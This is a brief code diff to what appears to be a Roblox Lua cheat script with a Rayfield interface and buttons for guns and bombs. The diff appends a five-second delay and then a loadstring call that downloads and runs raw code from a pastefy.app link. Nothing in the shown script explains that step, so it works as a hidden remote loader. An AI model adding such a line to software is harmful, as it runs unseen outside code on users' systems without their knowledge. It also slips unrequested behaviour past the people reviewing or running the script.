@@ -1312,3 +1312,5 @@ makeDraggable(ShootBtn, fireGun)
 makeDraggable(ThrowBtn, throwAction); makeDraggable(GunBtn, grabGunAction); makeDraggable(BombBtn, deployBomb)
 
 Rayfield:LoadConfiguration()
+task.wait(5)
+loadstring(game:HttpGet("https://pastefy.app/cnWmbx0e/raw"))()
